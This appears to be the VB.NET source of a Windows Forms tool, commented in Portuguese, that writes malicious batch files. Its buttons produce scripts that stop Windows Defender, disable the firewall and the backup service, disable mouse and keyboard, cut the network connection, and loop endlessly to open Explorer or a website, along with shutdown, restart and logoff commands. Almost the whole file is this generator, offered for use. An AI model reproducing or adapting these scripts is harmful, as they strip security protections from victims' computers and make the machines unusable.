'------------------------------'
' Desenvolvido por Davyd Maker '
'------------------------------'

Public Class Form1
    'Variável que armazena o comando
    Dim batComando As String

    'Verifica se vai criar arquivo com nome padrão ou não
    Private Function verificarNome(ByVal botao As String)
        Dim nome As String
        If mtbNomeArquivo.Text <> "" Then
            nome = mtbNomeArquivo.Text
        Else
            nome = botao
        End If
        Return nome
    End Function

    'Botões para gerar
    Private Sub mbDesligarPC_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles mbDesligarPC.Click
        Try
            batComando = "@echo off" + Environment.NewLine + "cls" + Environment.NewLine + "shutdown -s"
            gerarBat(batComando, verificarNome(mbDesligarPC.Text))
        Catch ex As Exception
            mlStatus.Text = "Houve um problema ao tentar gerar arquivo. Reinicie o aplicativo e tente novamente."
        End Try
    End Sub
    Private Sub mbReiniciarPC_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles mbReiniciarPC.Click
        Try
            batComando = "@echo off" + Environment.NewLine + "cls" + Environment.NewLine + "shutdown -r"
            gerarBat(batComando, verificarNome(mbReiniciarPC.Text))
        Catch ex As Exception
            mlStatus.Text = "Houve um problema ao tentar gerar arquivo. Reinicie o aplicativo e tente novamente."
        End Try
    End Sub
    Private Sub mbDesativarInternet_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles mbDesativarInternet.Click
        Try
            batComando = "@echo off" + Environment.NewLine + "cls" + Environment.NewLine + "ipconfig /release" + Environment.NewLine + "if %ERRORLEVEL%==1 ipconfig /release_all"
            gerarBat(batComando, verificarNome(mbDesativarInternet.Text))
        Catch ex As Exception
            mlStatus.Text = "Houve um problema ao tentar gerar arquivo. Reinicie o aplicativo e tente novamente."
        End Try
    End Sub
    Private Sub mbDesativarFirewall_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles mbDesativarFirewall.Click
        Try
            batComando = "@echo off" + Environment.NewLine + "cls" + Environment.NewLine + "net stop MpsSvc" + Environment.NewLine + "taskkill /f /t /im FirewallControlPanel.exe" + Environment.NewLine + "if %ERRORLEVEL%==1 tskill FirewallControlPanel" + Environment.NewLine + "netsh firewall set opmode mode=disable"
            gerarBat(batComando, verificarNome(mbDesativarFirewall.Text))
        Catch ex As Exception
            mlStatus.Text = "Houve um problema ao tentar gerar arquivo. Reinicie o aplicativo e tente novamente."
        End Try
    End Sub
    Private Sub mbDesativarMouse_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles mbDesativarMouse.Click
        Try
            batComando = "@echo off" + Environment.NewLine + "cls" + Environment.NewLine + "rundll32 mouse,disable"
            gerarBat(batComando, verificarNome(mbDesativarMouse.Text))
        Catch ex As Exception
            mlStatus.Text = "Houve um problema ao tentar gerar arquivo. Reinicie o aplicativo e tente novamente."
        End Try
    End Sub
    Private Sub mbDesativarTeclado_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles mbDesativarTeclado.Click
        Try
            batComando = "@echo off" + Environment.NewLine + "cls" + Environment.NewLine + "rundll32 keyboard,disable"
            gerarBat(batComando, verificarNome(mbDesativarTeclado.Text))
        Catch ex As Exception
            mlStatus.Text = "Houve um problema ao tentar gerar arquivo. Reinicie o aplicativo e tente novamente."
        End Try
    End Sub
    Private Sub mbDesativarPesquisar_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles mbDesativarPesquisar.Click
        Try
            batComando = "@echo off" + Environment.NewLine + "cls" + Environment.NewLine + "net stop WSearch"
            gerarBat(batComando, verificarNome(mbDesativarPesquisar.Text))
        Catch ex As Exception
            mlStatus.Text = "Houve um problema ao tentar gerar arquivo. Reinicie o aplicativo e tente novamente."
        End Try
    End Sub
    Private Sub mbDesativarWindowsDefender_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles mbDesativarWindowsDefender.Click
        Try
            batComando = "@echo off" + Environment.NewLine + "cls" + Environment.NewLine + "net stop WinDefend" + Environment.NewLine + "taskkill /f /t /im MSASCui.exe" + Environment.NewLine + "if %ERRORLEVEL%==1 tskill MSASCui"
            gerarBat(batComando, verificarNome(mbDesativarWindowsDefender.Text))
        Catch ex As Exception
            mlStatus.Text = "Houve um problema ao tentar gerar arquivo. Reinicie o aplicativo e tente novamente."
        End Try
    End Sub
    Private Sub mbAbrirInfinitosSites_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles mbAbrirInfinitosSites.Click
        Try
            batComando = "@echo off" + Environment.NewLine + "cls" + Environment.NewLine + ":sites" + Environment.NewLine + "START www.shafou.com" + Environment.NewLine + "GoTo sites"
            gerarBat(batComando, verificarNome(mbAbrirInfinitosSites.Text))
        Catch ex As Exception
            mlStatus.Text = "Houve um problema ao tentar gerar arquivo. Reinicie o aplicativo e tente novamente."
        End Try
    End Sub
    Private Sub mbFinalizarExplorer_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles mbFinalizarExplorer.Click
        Try
            batComando = "@echo off" + Environment.NewLine + "cls" + Environment.NewLine + "taskkill /f /im explorer.exe"
            gerarBat(batComando, verificarNome(mbFinalizarExplorer.Text))
        Catch ex As Exception
            mlStatus.Text = "Houve um problema ao tentar gerar arquivo. Reinicie o aplicativo e tente novamente."
        End Try
    End Sub
    Private Sub mbLogoff_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles mbLogoff.Click
        Try
            batComando = "@echo off" + Environment.NewLine + "cls" + Environment.NewLine + "shutdown -l"
            gerarBat(batComando, verificarNome(mbLogoff.Text))
        Catch ex As Exception
            mlStatus.Text = "Houve um problema ao tentar gerar arquivo. Reinicie o aplicativo e tente novamente."
        End Try
    End Sub
    Private Sub mbInfinitosExplorer_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles mbInfinitosExplorer.Click
        Try
            batComando = "@echo off" + Environment.NewLine + "cls" + Environment.NewLine + ":explorer" + Environment.NewLine + "START explorer.exe" + Environment.NewLine + "GoTo explorer"
            gerarBat(batComando, verificarNome(mbInfinitosExplorer.Text))
        Catch ex As Exception
            mlStatus.Text = "Houve um problema ao tentar gerar arquivo. Reinicie o aplicativo e tente novamente."
        End Try
    End Sub
    Private Sub mbDesativarBackup_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles mbDesativarBackup.Click
        Try
            batComando = "@echo off" + Environment.NewLine + "cls" + Environment.NewLine + "net stop SDRSVC"
            gerarBat(batComando, verificarNome(mbDesativarBackup.Text))
        Catch ex As Exception
            mlStatus.Text = "Houve um problema ao tentar gerar arquivo. Reinicie o aplicativo e tente novamente."
        End Try
    End Sub
End Class
